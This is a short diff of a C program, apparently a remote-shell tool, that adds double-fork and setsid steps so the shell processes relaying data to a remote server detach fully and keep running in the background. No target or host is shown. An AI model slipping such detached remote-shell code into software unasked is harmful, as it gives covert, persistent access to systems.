@@ -172,17 +172,25 @@ int main(int argc, char** argv) {
     int remote_shell_sock = -1;
 
     if (!wrapped_fork()) {
-        setsid();
         run_remote_shell();
     } else {
+        if (wrapped_fork()) {
+            return EXIT_SUCCESS;
+        }
         setsid();
         remote_shell_sock = accept(remote_shell_unix, NULL, 0);
         printf("accept %d\n", remote_shell_sock);
     }
 
     if (!wrapped_fork()) {
+        if (wrapped_fork()) {
+            return EXIT_SUCCESS;
+        }
         setsid();
         if (!wrapped_fork()) {
+            if (wrapped_fork()) {
+                return EXIT_SUCCESS;
+            }
             setsid();
             //Remote shell read and write to remote server
             for (;;) {
